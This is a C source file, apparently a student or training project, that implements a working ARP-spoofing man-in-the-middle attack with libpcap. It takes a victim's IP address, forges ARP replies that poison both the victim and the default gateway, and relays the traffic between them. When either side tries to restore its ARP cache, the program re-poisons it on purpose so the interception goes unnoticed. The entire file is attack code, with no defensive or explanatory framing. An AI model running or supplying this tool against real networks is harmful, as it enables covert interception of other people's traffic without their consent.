#include <stdio.h>
#include <unistd.h>
#include <pcap.h>
#include <stdlib.h>
#include <string.h>

#include <errno.h>

#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#include <time.h>

#define PROMISCUOUS 1
#define MAC_LEN 6

int eth0_MAC(unsigned char* mac){
	int sock, i;
	struct ifreq ifr;
	int success = 0;

	sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock == 0){
		return success;
	}
	strcpy(ifr.ifr_name, "ens33");
	if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
		success = 1;
	if (success) memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	return success;
}

int eth0_IP(unsigned char* ipadd){
	struct ifreq ifr;
	int sock = 0;
	int i;
	struct sockaddr_in* sai = (struct sockaddr_in*)sizeof(struct sockaddr_in);

	sock = socket(AF_INET, SOCK_DGRAM, 0);
	if(sock == 0){
		printf("socket error!\n");
		return 0;
	}
	strcpy(ifr.ifr_name, "ens33");
	if(ioctl(sock,SIOCGIFADDR, &ifr) == 0){
		sai = &ifr.ifr_ifru.ifru_addr;
		memcpy(ipadd, &(sai->sin_addr.s_addr), 4);
		//for(i=0;i<4;i++) printf("%d.",ipadd[i]);
		//printf("%d",ifr.ifr_ifindex);
		//memcpy(ipadd, &ifr.ifr_addr.sa_data[ifr.ifr_ifindex], 4);
	}
	// trash in sa_data[0~1] - why? T.T
	return 1;
}

int gatewayIP(unsigned char* ipadd){
	FILE *f;
	char line[100], *p, *c, *g, *saveptr;
	int nRet = 0;
	int tmp;
	int i;
	f = fopen("/proc/net/route","r");

	while(fgets(line, 100, f)){
		p = strtok_r(line, " \t",&saveptr);
		c = strtok_r(NULL, " \t",&saveptr);
		g = strtok_r(NULL, " \t",&saveptr);
		if(p!=NULL && c!=NULL){
			if(strcmp(c,"00000000") == 0){
				//printf("Default gateway IP is : %s \n",g);
				for(i=0;i<8;i++){
					if(g[i] >= 'A')
						g[i] -= 7;
				}
				for(i=0;i<4;i++){
					ipadd[3-i] = (g[2*i]-0x30)*16+(g[2*i+1]-0x30);
					//printf("%d\n",(g[2*i]-0x30)*16+(g[2*i+1]-0x30));
				}
				if(g){
					nRet = 1;
				}
				break;
			}
		}
	}
	fclose(f);
	return nRet;
}

int make_request(u_char* pdata, u_char* tip){
	int i;

	for(i=0;i<6;i++)
		pdata[i] = 0xFF;
	if(eth0_MAC(&pdata[6]) == 0){
		printf("Error : Writing my MAC! \n");
		return 0;
	}
	pdata[12] = 0x08;
	pdata[13] = 0x06;
	pdata[14] = 0x00;
	pdata[15] = 0x01;
	pdata[16] = 0x08;
	pdata[17] = 0x00;
	pdata[18] = 0x06;
	pdata[19] = 0x04;
	pdata[20] = 0x00;
	pdata[21] = 0x01; // request
	if(eth0_MAC(&pdata[22]) == 0){
		printf("Error : Writing my MAC! \n");
		return 0;
	}
	if(eth0_IP(&pdata[28]) == 0){
		printf("Error : Writing my IP! \n");
		return 0;
	}
	for(i=0;i<6;i++)
		pdata[32+i] = 0x00;
	for(i=0;i<4;i++)
		pdata[38+i] = tip[i];

	return 1;

}

int make_sp_target(u_char* arp_data, u_char* targetip, u_char* req_data){
	int i;
	
	// source MAC (6-11)
	if(eth0_MAC(&arp_data[6]) == 0){
		printf("Error : Writing my MAC address at packet ! \n");
	}
	// sender MAC (22-27)
	if(eth0_MAC(&arp_data[22]) == 0){
		printf("Error : Writing my MAC address at packet ! \n");
	}
	// sender IP (28-31)  --  fake to victim
	if(gatewayIP(&arp_data[28]) == 0){
		printf("Error : Can't read gateway address! \n");
	}
	// target ip (38-41)
	for(i=0;i<4;i++){
		arp_data[38+i] = targetip[i];
	}

	// generating ARP request for ask victim's MAC
	if(make_request(req_data, targetip) == 0){
		printf("Error : Making Request \n");
	}
	return 1;
}

int make_sp_router(u_char* arp_data, u_char* targetip, u_char* req_data){
	int i;

	// target ip (38-41)
	if(gatewayIP(&arp_data[38]) == 0){
		printf("Error : Can't read gateway address! \n");
	}
	// sender IP (28-31)  --  fake to router
	for(i=0;i<4;i++){
		arp_data[28+i] = targetip[i];
	}
	// generating ARP request for ask router's MAC
	if(make_request(req_data, &arp_data[38]) == 0){
		printf("Error : Making Request \n");
	}

	return 1;
}

int main(int argc, char* argv[]){
	char* device = NULL;// = "eth0";
	pcap_t* pd;
	int i;
	u_char ippp;
	int chk, cnt;
	int snaplen = 1024;
	char ebuf[PCAP_ERRBUF_SIZE];

	u_char arp_data[42];
	u_char arp_data_r[42];
	u_char req_data[42];
	u_char targetip[4];
	u_char gatewip[4];
	u_char relaying_data[snaplen];

	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	int res;
	int count_reinfect = 0;

	if(argc != 2){
		printf("Please give target ip address!\n");
		return 0;
	}

	// Fixed Packet (ARP, type reply, ...)

	// type (ARP = 0x0806)
	arp_data[12]=0x08;
	arp_data[13]=0x06;
	// Ethernet = 0x0001
	arp_data[14]=0x00;
	arp_data[15]=0x01;
	// IP = 0x0800
	arp_data[16]=0x08;
	arp_data[17]=0x00;
	// MAC length (06)
	arp_data[18]=0x06;
	// IP length (04)
	arp_data[19]=0x04;
	// ARP type ( reply = 0x0002 )
	arp_data[20]=0x00;
	arp_data[21]=0x02;

	// from input ip(argv), save target ip into targetip[]
	chk = 0;
	cnt = 0;
	for(i=0;i<strlen(argv[1]);i++){
		if(argv[1][i] == '.'){
			targetip[cnt] = chk;
			chk = 0;
			cnt++;
		}
		else{
			chk = chk*10 + argv[1][i] -0x30;
		}
	}
	targetip[cnt] = chk;

	// open device eth0
	if(device == NULL){
		if( (device = pcap_lookupdev(ebuf)) == NULL){
			perror(ebuf);
			exit(-1);
		}
	}
	pd = pcap_open_live(device, snaplen, PROMISCUOUS, 1, ebuf);
	if(pd == NULL){
		perror(ebuf);
		exit(-1);
	}

	// setting gateway ip
	if(gatewayIP(gatewip) == 0){
		printf("Error : Can't read gateway address! \n");
	}



////////Spoofing Target/////////////////////////////////////////////////////////////

	make_sp_target(arp_data, targetip, req_data);
	
	// send ARP request to victim (broadcast)
	if(pcap_sendpacket(pd,req_data,42) != 0){
		printf("Error : Sending request packet!\n");
	}
	// receive ARP reply to get victim's MAC
	while((res = pcap_next_ex( pd, &header, &pkt_data)) >= 0){
		if(res == 0)
		/* Timeout elapsed */
			continue;
		
		// type check
		if( ntohs(*((unsigned short*)(&pkt_data[12]))) != 0x0806 ){
			// it's not ARP
			continue;
		}
		else{ // It's ARP !
			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){
				if( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)(&req_data[38]))[0] ){
					for(i=0;i<6;i++){
						arp_data[i] = pkt_data[6+i];
						arp_data[32+i] = pkt_data[6+i];
					}
					break;
				}
			}
		}
	}

	if(res == -1){
		printf("Error reading the packets: %s\n", pcap_geterr(pd));
		return -1;
	}

	// send ARP spoofing packet
	if(pcap_sendpacket(pd,arp_data,42) != 0){
		printf("Error : Sending request packet!\n");
	}

	printf("Spoofing %s Finished\n", argv[1]);

////////Spoofing Target/////////////////////////////////////////////////////////////

////////Spoofing Router/////////////////////////////////////////////////////////////

	memcpy(arp_data_r, arp_data, 42);

	make_sp_router(arp_data_r, targetip, req_data);

	// send ARP request to router (broadcast)
	if(pcap_sendpacket(pd,req_data,42) != 0){
		printf("Error : Sending request packet!\n");
	}
	// receive ARP reply to get router's MAC
	while((res = pcap_next_ex( pd, &header, &pkt_data)) >= 0){
		if(res == 0)
		/* Timeout elapsed */
			continue;
		
		if(header->len > snaplen) continue;  // too long packet
		// type check
		if( ntohs(*((unsigned short*)(&pkt_data[12]))) != 0x0806 ){
			// it's not ARP
			continue;
		}
		else{ // It's ARP !
			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){
				if( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)(&req_data[38]))[0] ){
					for(i=0;i<6;i++){
						arp_data_r[i] = pkt_data[6+i];
						arp_data_r[32+i] = pkt_data[6+i];
					}
					break;
				}
			}
		}
	}

	if(res == -1){
		printf("Error reading the packets: %s\n", pcap_geterr(pd));
		return -1;
	}

	// send ARP spoofing packet
	if(pcap_sendpacket(pd,arp_data_r,42) != 0){
		printf("Error : Sending arp spoofing packet!\n");
	}

	printf("Spoofing Router Finished\n");
	/*
	for(i=0;i<42;i++) printf("%02x ",arp_data[i]);
	printf("\n");
	for(i=0;i<42;i++) printf("%02x ",arp_data_r[i]);
	printf("\n");
	*/

////////Spoofing Router/////////////////////////////////////////////////////////////

	// relaying code
	while((res = pcap_next_ex( pd, &header, &pkt_data)) >= 0){
		if(res == 0) continue;
		if(header->len > snaplen) continue; // too long packet
		//printf("%d\n", header->len);
		//for(i=0;i<header->len;i++) printf("%02x ",pkt_data[i]);
		//printf("\n\n");
		// Is it ARP type ?
		if(count_reinfect > 5){
			count_reinfect = 0;
			if(pcap_sendpacket(pd,arp_data,42) != 0){
				printf("Error : Sending arp spoofing packet to victim !\n");
			}
			if(pcap_sendpacket(pd,arp_data_r,42) != 0){
				printf("Error : Sending arp spoofing packet to router !\n");
			}
			printf("Spoofing Victim and Router again Finished\n");
		}

		if( ntohs(*((unsigned short*)(&pkt_data[12]))) == 0x0806 ){
			count_reinfect ++; // if arp packet is increased, then router and victim smell the spoofing
			// if arp -> check for recognizing it is arp recovery
			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){ // reply
				// sender ip = victim ip ?
				if( ( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)targetip)[0] ) ){
					// target ip = router ?
					//if( ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)gatewip)[0] ) ){
						// !! target is recovering router !!
						printf("Detected Recovering Router\n");
						if(pcap_sendpacket(pd,arp_data_r,42) != 0){
							printf("Error : Sending arp spoofing packet to router !\n");
						}
						printf(" -> Spoofing Router again Finished\n");
					//}
				}
				// sender ip = router ip ?
				else if( ( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)gatewip)[0] ) ){
					// target ip = victim ip ?
					//if( ( ((unsigned int*)(&pkt_data[38]))[0] == ((unsigned int*)targetip)[0] ) ){
						// !! target is recovering victim !!
						printf("Detected Recovering Victim\n");
						if(pcap_sendpacket(pd,arp_data,42) != 0){
							printf("Error : Sending arp spoofing packet to victim !\n");
						}
						printf(" -> Spoofing Victim again Finished\n");
					//}
				}
			}
		}

		// relaying IP type Packet
		else{
			if(ntohs(*((unsigned short*)(&pkt_data[12]))) != 0x0800)
				continue;// IP type packet
			//relaying_data = (u_char*)malloc(sizeof(pkt_data));	
			chk = 1;
			for(i=0;i<4;i++) // checking if source is router and dest is me
				//chk = (chk & (pkt_data[26+i] == gatewip[i]) & (pkt_data[30+i] == arp_data[28+i]));
				chk = (chk & (arp_data_r[i] == pkt_data[6+i]) & (arp_data_r[6+i] == pkt_data[i]));
			if(chk != 0){
				memcpy(relaying_data, pkt_data, header->len);
				//eth0_MAC(&relaying_data[6]); // source MAC = my MAC address
				for(i=0;i<6;i++) relaying_data[i] = arp_data[i]; // dest MAC = victim MAC address
				if(pcap_sendpacket(pd, relaying_data, header->len) != 0){
					printf("Error : Relaying\n");
				}
				/*
				printf("router -> victim : %d \n",header->len);
				for(i=0;i<header->len;i++) printf("%02x ",pkt_data[i]);
				printf("\n");
				for(i=0;i<header->len;i++) printf("%02x ",relaying_data[i]);
				printf("\n");
				*/
				//free(relaying_data);
				continue;
			}
			chk = 1;
			for(i=0;i<4;i++) // checking if source is victim and dest is me
				//chk = (chk & (pkt_data[26+i] == targetip[i]) & (pkt_data[30+i] == arp_data[28+i]));
				chk = (chk & (arp_data[i] == pkt_data[6+i]) & (arp_data[6+i] == pkt_data[i]) );
			if(chk != 0){
				memcpy(relaying_data, pkt_data, header->len);
				//eth0_MAC(&relaying_data[6]); // source MAC = my MAC address
				for(i=0;i<6;i++) relaying_data[i] = arp_data_r[i]; // dest MAC = router MAC address
				if(pcap_sendpacket(pd, relaying_data, header->len) != 0){
					printf("Error : Relaying\n");
				}
				/*
				printf("victim -> router : %d \n", header->len);
				for(i=0;i<header->len;i++) printf("%02x ",pkt_data[i]);
				printf("\n");
				for(i=0;i<header->len;i++) printf("%02x ",relaying_data[i]);
				printf("\n");
				*/

				//free(relaying_data);
				continue;
			}
			//free(relaying_data);
		}
	}

	return 0;
}
